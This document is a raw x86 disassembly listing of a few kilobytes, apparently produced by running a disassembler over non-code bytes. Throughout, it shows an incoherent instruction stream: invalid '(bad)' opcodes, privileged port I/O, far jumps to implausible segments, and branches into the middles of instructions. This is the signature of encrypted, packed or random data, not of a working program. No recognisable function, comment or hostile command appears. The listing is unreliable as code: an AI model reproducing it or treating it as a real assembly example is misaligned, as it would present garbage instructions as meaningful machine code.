  40d9c0:	icebp  
  40d9c1:	push   es
  40d9c2:	test   esp,edi
  40d9c4:	out    0x92,al
  40d9c6:	mov    edx,0xce06fb39
  40d9cb:	mov    ecx,0x12cde4a2
  40d9d0:	or     al,0x7c
  40d9d2:	aaa    
  40d9d3:	mov    esi,0x3863570
  40d9d8:	fwait
  40d9d9:	stc    
  40d9da:	mov    WORD PTR [ebx-0x3948cb8f],ss
  40d9e0:	ss je  0x40d9f2
  40d9e3:	or     ah,BYTE PTR [ecx-0x10f00846]
  40d9e9:	dec    esi
  40d9ea:	cmp    ebp,DWORD PTR [ecx+0x57]
  40d9ed:	xor    ebp,DWORD PTR [eax+0x3e]
  40d9f0:	ret    0x9c00
  40d9f3:	ret    
  40d9f4:	mov    esp,0x6cdefc3f
  40d9f9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40d9fb:	sub    dl,al
  40d9fd:	adc    DWORD PTR [esi-0x74b32715],ebp
  40da03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da04:	adc    al,0xce
  40da06:	or     BYTE PTR [esi+0xb],cl
  40da09:	add    edx,esp
  40da0b:	and    al,0xc1
  40da0d:	popa   
  40da0e:	push   ss
  40da0f:	dec    edx
  40da10:	ins    DWORD PTR es:[edi],dx
  40da11:	adc    al,0xd5
  40da13:	mov    DWORD PTR [edx+0x4e],edx
  40da16:	cmp    al,0x82
  40da18:	cs xchg edi,eax
  40da1a:	add    eax,0x89dc77bf
  40da1f:	push   es
  40da20:	push   ss
  40da21:	dec    ebx
  40da22:	push   esi
  40da23:	mov    BYTE PTR [edi+0x40da18e3],ah
  40da29:	test   al,0xdd
  40da2b:	lds    edx,FWORD PTR [ebx+eiz*8+0x38]
  40da2f:	sbb    DWORD PTR [edx],ebp
  40da31:	sub    eax,0x64b742df
  40da36:	mov    dl,0x46
  40da38:	(bad)  
  40da39:	cwde   
  40da3a:	sub    eax,0xb5fc2fd7
  40da3f:	test   BYTE PTR [edx],bh
  40da41:	aaa    
  40da42:	mov    WORD PTR [esi*1+0x585aed50],gs
  40da49:	out    0x7d,al
  40da4b:	int3   
  40da4c:	fcmove st,st(2)
  40da4e:	lods   eax,DWORD PTR ds:[esi]
  40da4f:	fmul   QWORD PTR [ebp+0x32]
  40da52:	sahf   
  40da53:	jo     0x40da25
  40da55:	and    eax,0xa202802d
  40da5a:	aad    0xf9
  40da5c:	push   cs
  40da5d:	lock mov ebx,0xc9e71634
  40da63:	or     BYTE PTR [eax],cl
  40da65:	in     eax,0x13
  40da67:	or     DWORD PTR [edi+eiz*2],ebp
  40da6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da6b:	mov    esp,0x7df76259
  40da70:	and    DWORD PTR ds:0x3fe39357,0xffffffc5
  40da77:	fidiv  WORD PTR [eax]
  40da79:	push   ecx
  40da7a:	mov    esp,0x4bdc58e2
  40da7f:	push   edx
  40da80:	xor    esp,DWORD PTR [edi+0x48]
  40da83:	jno    0x40da1e
  40da85:	out    dx,eax
  40da86:	(bad)  
  40da87:	in     eax,dx
  40da88:	xchg   esp,eax
  40da89:	xchg   BYTE PTR [esi+0x41],cl
  40da8c:	lods   al,BYTE PTR ds:[esi]
  40da8d:	les    esi,FWORD PTR ds:0x33857271
  40da93:	adc    esi,edx
  40da95:	xlat   BYTE PTR ds:[ebx]
  40da96:	cmp    al,0xa6
  40da98:	cmp    al,BYTE PTR [edx]
  40da9a:	inc    eax
  40da9b:	(bad)  
  40da9c:	lock and ah,BYTE PTR ds:0x93c21f41
  40daa3:	xor    edi,esp
  40daa5:	cmp    BYTE PTR [bp+si],0x8b
  40daa9:	xor    esi,esi
  40daab:	mov    eax,0xe41fe784
  40dab0:	jmp    0x40db30
  40dab2:	(bad)  
  40dab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab4:	aad    0x66
  40dab6:	adc    ah,BYTE PTR [ecx+0x6632730b]
  40dabc:	pop    ebp
  40dabd:	or     al,0x8c
  40dabf:	sbb    dh,bl
  40dac1:	imul   esi,DWORD PTR [ecx+0x35],0xffffffdf
  40dac5:	std    
  40dac6:	mov    eax,0x1c9c6a32
  40dacb:	aaa    
  40dacc:	sar    DWORD PTR [eax],cl
  40dace:	mov    bl,0x7b
  40dad0:	les    ebp,FWORD PTR [ebx-0x13]
  40dad3:	fidivr WORD PTR [edx-0x5d]
  40dad6:	stc    
  40dad7:	push   ebx
  40dad8:	js     0x40dae8
  40dada:	lds    ebx,FWORD PTR [esi]
  40dadc:	pop    eax
  40dadd:	push   0xafd6cbd0
  40dae2:	loop   0x40db2f
  40dae4:	adc    eax,0x51c4729a
  40dae9:	xor    eax,0x22983f34
  40daee:	(bad)  
  40daef:	jno    0x40da79
  40daf1:	mov    ch,0xc
  40daf3:	aam    0x37
  40daf5:	outs   dx,BYTE PTR ds:[esi]
  40daf6:	jo     0x40db61
  40daf8:	or     BYTE PTR [eax-0x3b],0xb9
  40dafc:	jecxz  0x40db0a
  40dafe:	ret    0xcdfe
  40db01:	retf   
  40db02:	test   eax,esi
  40db04:	call   0xe8453cc4
  40db09:	push   ss
  40db0a:	and    bh,dl
  40db0c:	loopne 0x40daa5
  40db0e:	push   esi
  40db0f:	push   eax
  40db10:	xchg   DWORD PTR [ebx-0x3b8ee448],edi
  40db16:	or     eax,0xc961db56
  40db1b:	xchg   edx,eax
  40db1c:	cmp    bl,BYTE PTR [ecx-0x43]
  40db1f:	push   esp
  40db20:	pop    edx
  40db21:	(bad)  
  40db22:	outs   dx,DWORD PTR ds:[esi]
  40db23:	cmp    ebp,eax
  40db25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db26:	sti    
  40db27:	xchg   esi,eax
  40db28:	xchg   BYTE PTR [edx+0x70],dh
  40db2b:	in     eax,dx
  40db2c:	mov    ah,0x23
  40db2e:	hlt    
  40db2f:	stos   BYTE PTR es:[edi],al
  40db30:	clc    
  40db31:	sahf   
  40db32:	shl    DWORD PTR [edx+0x6310772a],cl
  40db38:	inc    eax
  40db39:	sub    al,0xa9
  40db3b:	or     eax,DWORD PTR [edi-0x2b68adcf]
  40db41:	rol    BYTE PTR [edx-0x5e],0xd2
  40db45:	js     0x40db3c
  40db47:	enter  0xad97,0x6b
  40db4b:	sahf   
  40db4c:	imul   ebx,DWORD PTR [eax+0x3eba83e8],0x1
  40db53:	lea    esp,[ebx+0x67]
  40db56:	and    BYTE PTR [edi-0xf],bl
  40db59:	mov    edi,0x3a2df237
  40db5e:	addr16 push eax
  40db60:	(bad)  
  40db62:	lock pop esi
  40db64:	cs pop eax
  40db66:	ret    
  40db67:	loop   0x40db56
  40db69:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40db6b:	dec    ebx
  40db6c:	and    eax,0x32bcb8c
  40db71:	aas    
  40db72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db73:	xchg   ecx,eax
  40db74:	dec    ebp
  40db75:	call   0xda7c:0x8402d937
  40db7c:	stos   BYTE PTR es:[edi],al
  40db7d:	aad    0x6c
  40db7f:	lods   al,BYTE PTR ds:[esi]
  40db80:	push   ecx
  40db81:	push   edi
  40db82:	mov    edx,0xa31d7455
  40db87:	or     BYTE PTR [edi+edx*1+0x2c47a42f],0x5e
  40db8f:	xchg   BYTE PTR [esi-0x69],ah
  40db92:	lods   al,BYTE PTR ds:[esi]
  40db93:	call   0xb213a717
  40db98:	rcr    cl,cl
  40db9a:	jns    0x40dbd2
  40db9c:	and    DWORD PTR [edx],ecx
  40db9e:	mov    edx,DWORD PTR ds:0x361b0f00
  40dba4:	fidiv  DWORD PTR [edi+0x739704a5]
  40dbaa:	lds    edx,FWORD PTR [ecx]
  40dbac:	xor    al,0xae
  40dbae:	rcr    DWORD PTR [edx],0x5a
  40dbb1:	sbb    eax,0xea01cf43
  40dbb6:	rol    DWORD PTR [ecx+0x215b1089],0xad
  40dbbd:	leave  
  40dbbe:	inc    eax
  40dbbf:	jns    0x40dc02
  40dbc1:	div    bl
  40dbc3:	in     eax,dx
  40dbc4:	fcomp  QWORD PTR [esi+0x64]
  40dbc7:	das    
  40dbc8:	or     ebp,DWORD PTR [edi+0x57]
  40dbcb:	jecxz  0x40dbda
  40dbcd:	call   eax
  40dbcf:	in     eax,0x61
  40dbd1:	jle    0x40dba2
  40dbd3:	push   ds
  40dbd4:	retf   0x912b
  40dbd7:	dec    edx
  40dbd8:	sbb    BYTE PTR [ebx-0x55],ch
  40dbdb:	loopne 0x40db72
  40dbdd:	fisubr WORD PTR [edi-0x48]
  40dbe0:	stos   WORD PTR es:[edi],ax
  40dbe2:	icebp  
  40dbe3:	xchg   DWORD PTR [edx-0x1b],ebp
  40dbe6:	mov    eax,0x38b82258
  40dbeb:	jb     0x40dbe1
  40dbed:	adc    esp,0x32a59a70
  40dbf3:	jmp    0xaa65:0xb3e875b7
  40dbfa:	add    dl,BYTE PTR [ecx]
  40dbfc:	add    eax,ebx
  40dbfe:	sub    ah,BYTE PTR [ecx+0x22]
  40dc01:	inc    edi
  40dc02:	inc    eax
  40dc03:	cmp    al,0x64
  40dc05:	aad    0xdb
  40dc07:	or     ebx,ebp
  40dc09:	icebp  
  40dc0a:	push   esp
  40dc0b:	xchg   esp,eax
  40dc0c:	sbb    eax,0x73774930
  40dc11:	call   0xce3b1f9f
  40dc16:	xchg   ebp,eax
  40dc17:	sub    DWORD PTR [ebx+ecx*4+0x7583b7d4],0x4b627496
  40dc22:	popa   
  40dc23:	push   eax
  40dc24:	addr16 cwde 
  40dc26:	and    al,0xe2
  40dc28:	dec    ecx
  40dc29:	push   ebp
  40dc2a:	inc    ebx
  40dc2b:	rcr    BYTE PTR [ecx-0x50],0xfb
  40dc2f:	sti    
  40dc30:	fisubr WORD PTR [ecx]
  40dc32:	jmp    0xbce583cd
  40dc37:	cmp    eax,0x2f75b6ec
  40dc3c:	dec    ebx
  40dc3d:	adc    cl,BYTE PTR [esi+0x74f77c84]
  40dc43:	sbb    DWORD PTR [edx+0x3a53c98c],ecx
  40dc49:	aas    
  40dc4a:	imul   ebp,DWORD PTR [ebp+0x2],0xffffff97
  40dc4e:	sub    BYTE PTR [ecx],cl
  40dc50:	and    edx,ebx
  40dc52:	hlt    
  40dc53:	aaa    
  40dc54:	(bad)  
  40dc55:	jo     0x40dc75
  40dc57:	ds and eax,0xbc148a81
  40dc5d:	xchg   ecx,eax
  40dc5e:	cdq    
  40dc5f:	xchg   ebx,eax
  40dc60:	gs popf 
  40dc62:	inc    edx
  40dc63:	sbb    BYTE PTR es:0x1a6a8655,dl
  40dc6a:	add    al,0xd1
  40dc6c:	repz aaa 
  40dc6e:	out    0x16,al
  40dc70:	aas    
  40dc71:	inc    eax
  40dc72:	push   ss
  40dc73:	and    eax,DWORD PTR [eax]
  40dc75:	pop    ecx
  40dc76:	or     ch,bh
  40dc78:	pushf  
  40dc79:	jmp    0x974b:0xe869b5e2
  40dc80:	loope  0x40dc28
  40dc82:	or     eax,0x8ba0f42e
  40dc87:	lock call 0x14d1129c
  40dc8d:	push   esp
  40dc8e:	ret    
  40dc8f:	mov    ecx,0xad74d604
  40dc94:	dec    ecx
  40dc95:	jns    0x40dcc4
  40dc97:	xchg   BYTE PTR [edx+ecx*2-0x5e],bl
  40dc9b:	xor    eax,0xc9ff3bb0
  40dca0:	mov    bh,0x40
  40dca2:	popa   
  40dca3:	xor    al,0xe6
  40dca5:	imul   eax,ecx,0xfffffff8
  40dca8:	aam    0x2d
  40dcaa:	jl     0x40dd25
  40dcac:	lds    edi,FWORD PTR [esi]
  40dcae:	jns    0x40dc47
  40dcb0:	jecxz  0x40dd10
  40dcb2:	jmp    0x40dd2d
  40dcb4:	and    ah,BYTE PTR ds:0x851d5cee
  40dcba:	push   esp
  40dcbb:	push   edx
  40dcbc:	mov    cx,0x5495
  40dcc0:	loop   0x40dc97
  40dcc2:	lods   al,BYTE PTR ds:[esi]
  40dcc3:	push   esi
  40dcc4:	mov    BYTE PTR [edi+esi*4],dl
  40dcc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcc8:	lahf   
  40dcc9:	ret    0x6c7d
  40dccc:	loope  0x40dcc9
  40dcce:	fist   DWORD PTR [edi+0x57]
  40dcd1:	test   DWORD PTR [eax+0x58],eax
  40dcd4:	aam    0xb6
  40dcd6:	mov    al,ds:0x152986a5
  40dcdb:	pop    edi
  40dcdc:	ret    
  40dcdd:	es or  dl,0xea
  40dce1:	loopne 0x40dcee
  40dce3:	ret    
  40dce4:	xor    bh,BYTE PTR [ecx]
  40dce6:	mov    eax,ds:0x60217e19
  40dceb:	mov    al,BYTE PTR [ebp-0x48d4d7fd]
  40dcf1:	out    0x3d,eax
  40dcf3:	(bad)  
  40dcf4:	lods   al,BYTE PTR ds:[esi]
  40dcf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcf6:	add    ah,ch
  40dcf8:	rcl    BYTE PTR [edx],cl
  40dcfa:	push   0x26c60b1d
  40dcff:	fdivr  DWORD PTR [edi+0x7f]
  40dd02:	jmp    0x9c47:0x885f20a1
  40dd09:	aaa    
  40dd0a:	pushf  
  40dd0b:	inc    ebx
  40dd0c:	popa   
  40dd0d:	jne    0x40dd73
  40dd0f:	inc    ecx
  40dd10:	mov    DWORD PTR [ecx],ecx
  40dd12:	adc    DWORD PTR [esi-0x41],ecx
  40dd15:	es jmp 0xa68d:0x55bf293d
  40dd1d:	out    dx,eax
  40dd1e:	lahf   
  40dd1f:	push   ecx
  40dd20:	ss (bad) 
  40dd22:	jb     0x40dd4f
  40dd24:	imul   esp,esi,0x65
  40dd27:	jns    0x40dd83
  40dd29:	adc    BYTE PTR [ecx+0x1b],al
  40dd2c:	cli    
  40dd2d:	and    eax,DWORD PTR [eax]
  40dd2f:	jmp    0x40dccb
  40dd31:	test   BYTE PTR [ebx+0xe0e941b],al
  40dd37:	popf   
  40dd38:	jnp    0x40dd78
  40dd3a:	adc    DWORD PTR [ebp+0x4b7b7308],ebx
  40dd40:	adc    DWORD PTR [ebp-0x39f53790],0x781ce62c
  40dd4a:	not    BYTE PTR [edi+0x3f]
  40dd4d:	repz inc ebx
  40dd4f:	dec    bx
  40dd51:	adc    bl,BYTE PTR [edi-0x4c]
  40dd54:	das    
  40dd55:	pop    ss
  40dd56:	aaa    
  40dd57:	add    cl,ch
  40dd59:	imul   esi,DWORD PTR [edi+0x33],0x23
  40dd5d:	shl    BYTE PTR [edi],1
  40dd5f:	xchg   ebx,eax
  40dd60:	and    bl,BYTE PTR [esi+0x112da80a]
  40dd66:	jl     0x40ddd1
  40dd68:	lods   al,BYTE PTR ds:[esi]
  40dd69:	fs stos BYTE PTR es:[edi],al
  40dd6b:	stos   BYTE PTR es:[edi],al
  40dd6c:	xor    eax,0x6026e503
  40dd71:	add    DWORD PTR [ecx+0x6c],esi
  40dd74:	mov    bh,0xe
  40dd76:	das    
  40dd77:	cmp    esi,DWORD PTR [esi]
  40dd79:	lods   al,BYTE PTR ds:[esi]
  40dd7a:	xchg   ebx,eax
  40dd7b:	add    BYTE PTR [eax+0x70737567],ah
  40dd81:	js     0x40dde2
  40dd83:	jg     0x40dd2e
  40dd85:	dec    ebp
  40dd86:	jmp    0xccdec375
  40dd8b:	test   esi,esi
  40dd8d:	rcl    DWORD PTR [ebp+eiz*2+0x55],1
  40dd91:	add    eax,0x8b4096a5
  40dd96:	mov    dl,0x35
  40dd98:	fld    QWORD PTR [ebp-0x2a]
  40dd9b:	xor    al,0xed
  40dd9d:	mov    dl,0x12
  40dd9f:	jmp    0xf4a:0x31b95742
  40dda6:	push   ds
  40dda7:	mov    ecx,0xf2546d5c
  40ddac:	int    0xd6
  40ddae:	fst    st(2)
  40ddb0:	shl    DWORD PTR [edi-0x3d],1
  40ddb3:	xchg   DWORD PTR ds:0xfdb09d93,edi
  40ddb9:	pop    ebp
  40ddba:	sti    
  40ddbb:	xchg   edx,eax
  40ddbc:	mov    ebp,0x8e7a3502
  40ddc1:	dec    ebp
  40ddc2:	dec    eax
  40ddc3:	pop    ss
  40ddc4:	sub    DWORD PTR [eax],ebp
  40ddc6:	out    dx,eax
  40ddc7:	scas   al,BYTE PTR es:[edi]
  40ddc8:	neg    ch
  40ddca:	dec    ebp
  40ddcb:	jne    0x40dd89
  40ddcd:	inc    ecx
  40ddce:	in     al,dx
  40ddcf:	sahf   
  40ddd0:	dec    esi
  40ddd1:	xor    DWORD PTR [eax],esp
  40ddd3:	jecxz  0x40ddb1
  40ddd5:	jmp    0x40dd7b
  40ddd7:	sbb    BYTE PTR [ecx+0x76],bh
  40ddda:	in     eax,0x82
  40dddc:	inc    eax
  40dddd:	ds enter 0x9a5d,0x50
  40dde2:	in     al,dx
  40dde3:	push   0x776df984
  40dde8:	loop   0x40dd8c
  40ddea:	dec    BYTE PTR [edx+ebx*2+0x41]
  40ddee:	outs   dx,DWORD PTR ds:[esi]
  40ddef:	lods   al,BYTE PTR ds:[esi]
  40ddf0:	int    0x6d
  40ddf2:	bound  esi,QWORD PTR [si+0x6f]
  40ddf6:	push   0xf524d4f
  40ddfb:	inc    ebp
  40ddfc:	fidivr WORD PTR [ebx]
  40ddfe:	shr    BYTE PTR [ecx+0x5fbb4f09],1
  40de04:	add    DWORD PTR [ecx],ecx
  40de06:	pop    ebp
  40de07:	shr    cl,1
  40de09:	test   DWORD PTR [ecx+0x48],0x458f4749
  40de10:	aas    
  40de11:	xchg   BYTE PTR [edi-0x14daf012],bh
  40de17:	push   esi
  40de18:	test   al,0x2f
  40de1a:	scas   eax,DWORD PTR es:[edi]
  40de1b:	hlt    
  40de1c:	mov    edx,0xdaebaae5
  40de21:	bound  esi,QWORD PTR [esi+0x3e]
  40de24:	and    eax,0x476a23fb
  40de29:	sub    ecx,esp
  40de2b:	es inc edi
  40de2d:	mov    bl,0x63
  40de2f:	repnz xlat BYTE PTR ds:[ebx]
  40de31:	sar    DWORD PTR [ebx],0x53
  40de34:	xchg   ebp,eax
  40de35:	lds    ebx,FWORD PTR [eax]
  40de37:	out    dx,al
  40de38:	push   esi
  40de39:	ficomp DWORD PTR [eax]
  40de3b:	test   al,0xb8
  40de3d:	(bad)  
  40de3e:	and    eax,0xab92a9f
  40de43:	and    BYTE PTR [eax],bh
  40de45:	pop    esp
  40de46:	jne    0x40de9c
  40de48:	test   DWORD PTR [esp+edi*8+0x13f01e47],ebp
  40de4f:	test   BYTE PTR [esi],0x73
  40de52:	cld    
  40de53:	xor    al,0x85
  40de55:	sub    eax,0xceaa0627
  40de5a:	test   BYTE PTR [ebx-0x6f940563],ch
  40de60:	mov    esp,0x6b74d5a9
  40de65:	mov    edx,0x29222612
  40de6a:	test   BYTE PTR [eax+edx*8],dl
  40de6d:	fmul   DWORD PTR [edi]
  40de6f:	jp     0x40deac
  40de71:	enter  0x9703,0xb2
  40de75:	jmp    0x40dea5
  40de77:	icebp  
  40de78:	pop    esp
  40de79:	or     al,0x6e
  40de7b:	pop    edi
  40de7c:	ins    BYTE PTR es:[edi],dx
  40de7d:	mov    eax,0xcbb6dfac
  40de82:	lea    eax,[edi]
  40de84:	and    eax,0x3312eaa1
  40de89:	out    dx,eax
  40de8a:	cwde   
  40de8b:	xchg   DWORD PTR [ebx],esp
  40de8d:	shl    BYTE PTR [ebx+eiz*1],0xed
  40de91:	popf   
  40de92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de93:	ds dec eax
  40de95:	sbb    DWORD PTR [edx],0x1e519910
  40de9b:	cld    
  40de9c:	pop    ebp
  40de9d:	cmp    esi,DWORD PTR [ebx]
  40de9f:	pop    ebp
  40dea0:	ss mov edx,0xf1d06a8c
  40dea6:	ror    BYTE PTR [ebx-0x29d347e4],cl
  40deac:	dec    ecx
  40dead:	data16 int 0x2a
  40deb0:	call   0xdc76:0xcbd9c33d
  40deb7:	inc    edi
  40deb8:	nop
  40deb9:	repz mov edi,0x9bfffb5f
  40debf:	fsubp  st(0),st
  40dec1:	inc    esp
  40dec2:	jne    0x40df19
  40dec4:	mov    ebx,0x3ac0a4fe
  40dec9:	xchg   ebp,eax
  40deca:	sub    dh,al
  40decc:	clc    
  40decd:	pop    es
  40dece:	cli    
  40decf:	shl    eax,1
  40ded1:	sar    ebp,0xeb
  40ded4:	pop    ebp
  40ded5:	cmc    
  40ded6:	es stos DWORD PTR es:[edi],eax
  40ded8:	pop    esi
  40ded9:	dec    eax
  40deda:	std    
  40dedb:	popa   
  40dedc:	cwde   
  40dedd:	ss xor ch,bl
  40dee0:	call   0xa4aeaec3
  40dee5:	xor    eax,DWORD PTR [eax]
  40dee7:	jge    0x40de96
  40dee9:	sbb    DWORD PTR [edx-0x6c],eax
  40deec:	xchg   edi,eax
  40deed:	aaa    
  40deee:	cmc    
  40deef:	mov    cl,0x2f
  40def1:	in     eax,0x8b
  40def3:	dec    ecx
  40def4:	adc    BYTE PTR [ebp-0x486d175b],bh
  40defa:	outs   dx,BYTE PTR ds:[esi]
  40defb:	push   esp
  40defc:	push   ebx
  40defd:	in     eax,0xa4
  40deff:	push   ss
  40df00:	mov    ch,0xf4
  40df02:	pop    ebp
  40df03:	cli    
  40df04:	add    DWORD PTR [ebx+0x44d61213],ecx
  40df0a:	shl    BYTE PTR [ebp-0x5bf486cc],1
  40df10:	aaa    
  40df11:	repnz scas eax,DWORD PTR es:[edi]
  40df13:	dec    edi
  40df14:	mov    BYTE PTR [eax],cl
  40df16:	push   ebx
  40df17:	adc    DWORD PTR [edx-0xf],edi
  40df1a:	imul   eax,edx,0x18
  40df1d:	jmp    0xcb9d:0x2a146c5c
  40df24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df25:	add    eax,DWORD PTR [edi+0x50]
  40df28:	lock iret 
  40df2a:	jo     0x40df9e
  40df2c:	jl     0x40deff
  40df2e:	push   eax
  40df2f:	cmp    BYTE PTR [ecx],dl
  40df31:	stos   DWORD PTR es:[edi],eax
  40df32:	js     0x40df74
  40df34:	dec    ecx
  40df35:	jno    0x40df7a
  40df37:	add    al,0xc4
  40df39:	sub    ebp,DWORD PTR [ebx]
  40df3b:	retf   
  40df3c:	sbb    dl,BYTE PTR [edx]
  40df3e:	in     al,dx
  40df3f:	and    edx,0x66
  40df42:	ins    DWORD PTR es:[edi],dx
  40df43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df44:	das    
  40df45:	inc    ecx
  40df46:	inc    ebx
  40df47:	and    eax,0xc41e6a16
  40df4c:	(bad)
  40df50:	and    BYTE PTR [esi-0x2e],cl
  40df53:	cdq    
  40df54:	xchg   ecx,eax
  40df55:	mov    bh,0x87
  40df57:	cmp    ebx,DWORD PTR [edx-0x4e]
  40df5a:	int3   
  40df5b:	(bad)  
  40df5c:	sahf   
  40df5d:	nop
  40df5e:	repnz aaa 
  40df60:	into   
  40df61:	or     BYTE PTR [ebx+0x7c],ah
  40df64:	scas   al,BYTE PTR es:[edi]
  40df65:	lock sahf 
  40df67:	push   edx
  40df68:	push   edx
  40df69:	mov    edx,ss
  40df6b:	cmp    esp,DWORD PTR [ebp+0x5c]
  40df6e:	retf   
  40df6f:	mov    WORD PTR [edx+edx*4+0x14fe33ef],?
  40df76:	jo     0x40df73
  40df78:	jmp    0x9a1c:0x8eaaa681
  40df7f:	out    0xb6,al
  40df81:	test   DWORD PTR [edi+ebx*1+0x29],edx
  40df85:	scas   eax,DWORD PTR es:[edi]
  40df86:	inc    ebp
  40df87:	xchg   ecx,eax
  40df88:	add    BYTE PTR [ecx+eax*1-0x50],cl
  40df8c:	sbb    BYTE PTR [eax-0x73],ah
  40df8f:	push   0xffffffbe
  40df91:	dec    edx
  40df92:	out    0xdb,al
  40df94:	mov    dl,BYTE PTR [esi]
  40df96:	rcl    BYTE PTR [ebx+edi*2-0x73a36267],1
  40df9d:	in     eax,0x1b
  40df9f:	fs dec edx
  40dfa1:	repnz int 0x6e
  40dfa4:	dec    eax
  40dfa5:	ror    BYTE PTR [edi],0xc7
  40dfa8:	sbb    BYTE PTR [ebx+eax*8+0x77],al
  40dfac:	xor    ebx,DWORD PTR [edx+0x392d722e]
  40dfb2:	and    eax,0x49e64532
  40dfb7:	sub    eax,0xbc048123
  40dfbc:	mov    DWORD PTR gs:0x36233602,ebp
  40dfc3:	test   eax,0x746309cb
  40dfc8:	stc    
  40dfc9:	sub    DWORD PTR [esi+ebp*1-0x10],ebx
  40dfcd:	cmc    
  40dfce:	jl     0x40df9d
  40dfd0:	add    esp,eax
  40dfd2:	cmp    esi,esp
  40dfd4:	leave  
  40dfd5:	mov    edx,0x8f0ccab0
  40dfda:	fmul   st(2),st
  40dfdc:	fld    TBYTE PTR [esi]
  40dfde:	fninit 
  40dfe0:	push   eax
  40dfe1:	cmp    DWORD PTR [eax+eax*8+0x3a],eax
  40dfe5:	add    BYTE PTR [edi+0x2fdff7ad],0xb
  40dfec:	fistp  QWORD PTR [eax-0x12afb690]
  40dff2:	xchg   ecx,eax
  40dff3:	fnstcw WORD PTR [ebx+0x11079281]
  40dff9:	pop    ebp
  40dffa:	fcomp  DWORD PTR [ecx+edi*4-0x76]
  40dffe:	ret    
  40dfff:	and    ebx,edi
  40e001:	jg     0x40e05b
  40e003:	out    dx,eax
  40e004:	div    BYTE PTR [ebx-0x786d83c0]
  40e00a:	or     DWORD PTR [edi+ecx*8+0xa],0x389469f7
  40e012:	jns    0x40e04e
  40e014:	sub    edx,DWORD PTR [esi-0x76]
  40e017:	push   edx
  40e018:	push   0x29
  40e01a:	mov    ch,0x35
  40e01c:	xchg   esp,eax
  40e01d:	imul   edx,DWORD PTR [esi-0x34],0xa81d457
  40e024:	ss in  eax,0x8e
  40e027:	xchg   ebp,eax
  40e028:	cmp    eax,0xe25cdc09
  40e02d:	mov    BYTE PTR [edi],bh
  40e02f:	mov    al,ds:0xd0de4203
  40e034:	add    BYTE PTR [edx+ebp*8+0x22f48cf9],bl
  40e03b:	mov    ds,WORD PTR [esi-0x17]
  40e03e:	adc    ebp,DWORD PTR [ebp+0x65316e79]
  40e044:	jecxz  0x40e07a
  40e046:	leave  
  40e047:	sub    BYTE PTR [edi-0x5f],0x1c
  40e04b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e04c:	iret   
  40e04d:	sahf   
  40e04e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e04f:	mov    ah,0x7b
  40e051:	push   eax
  40e052:	or     eax,0x88097a78
  40e057:	lods   eax,DWORD PTR ss:[esi]
  40e059:	lods   eax,DWORD PTR ds:[esi]
  40e05a:	mov    ah,BYTE PTR [edi-0x9f1a58d]
  40e060:	mov    al,ds:0xc364b0ce
  40e065:	fdivr  st,st(6)
  40e067:	or     bh,BYTE PTR [ebp-0x4d]
  40e06a:	add    al,0x59
  40e06c:	push   edx
  40e06d:	cmp    BYTE PTR [eax+0x8],al
  40e070:	add    eax,0xce66509e
  40e075:	mov    eax,ds:0x9c60d5e8
  40e07a:	or     cl,BYTE PTR [ecx-0x7e]
  40e07d:	pop    ebx
  40e07e:	and    al,BYTE PTR [edx-0x66]
  40e081:	cmp    al,0x50
  40e083:	add    eax,0x264453f6
  40e088:	outs   dx,DWORD PTR ds:[esi]
  40e089:	(bad)  
  40e08a:	pop    edx
  40e08b:	dec    ebp
  40e08c:	sbb    cl,BYTE PTR [eax+esi*4+0x610de7e]
  40e093:	retf   
  40e094:	jmp    0x94e652ac
  40e099:	ss ret 0xa513
  40e09d:	in     al,dx
  40e09e:	aas    
  40e09f:	and    ebp,esi
  40e0a1:	mov    es,WORD PTR [eax]
  40e0a3:	dec    ebx
  40e0a4:	pop    ss
  40e0a5:	mov    edi,0x9ff86585
  40e0aa:	mov    ebp,0x5e7535d3
  40e0af:	sbb    cl,BYTE PTR ds:[ebx+0x64]
  40e0b3:	xchg   edi,eax
  40e0b4:	dec    esi
  40e0b5:	dec    edx
  40e0b6:	mov    ecx,ebp
  40e0b8:	jns    0x40e083
  40e0ba:	jmp    DWORD PTR [esi]
  40e0bc:	add    al,0xe2
  40e0be:	mov    dh,0xd6
  40e0c0:	in     eax,dx
  40e0c1:	mov    edi,0xe21fc27a
  40e0c6:	xor    BYTE PTR [esi],ch
  40e0c8:	pop    esi
  40e0c9:	cmp    edx,DWORD PTR [esi-0x7e43080f]
  40e0cf:	fidiv  DWORD PTR [eax-0x3d]
  40e0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0d3:	push   cs
  40e0d4:	dec    ecx
  40e0d5:	xchg   edx,eax
  40e0d6:	cli    
  40e0d7:	mov    ds:0xcf48786c,eax
  40e0dc:	inc    edx
  40e0dd:	mov    bl,0xbc
  40e0df:	mov    BYTE PTR [edi+0x32],al
  40e0e2:	mov    eax,ds:0x869518bc
  40e0e7:	sub    dh,BYTE PTR [ebx+edi*4-0x19]
  40e0eb:	jg     0x40e0c7
  40e0ed:	add    ebp,DWORD PTR [eax+0x3b89eae2]
  40e0f3:	out    dx,al
  40e0f4:	addr16 jae 0x40e10b
  40e0f7:	jl     0x40e0e6
  40e0f9:	mov    al,ds:0xdde296e9
  40e0fe:	ins    BYTE PTR es:[edi],dx
  40e0ff:	popa   
  40e100:	pop    ebx
  40e101:	faddp  st(3),st
  40e103:	xchg   ebp,eax
  40e104:	mov    al,ds:0x69a6c3fe
  40e109:	pop    edi
  40e10a:	popa   
  40e10b:	xor    al,bl
  40e10d:	adc    DWORD PTR [esi+0x2e2f4cdf],ebx
  40e113:	jl     0x40e11d
  40e115:	jle    0x40e115
  40e117:	rcr    BYTE PTR [ebp+eax*1-0xf],0x9b
  40e11c:	addr16 aam 0x42
  40e11f:	jb     0x40e0e0
  40e121:	lahf   
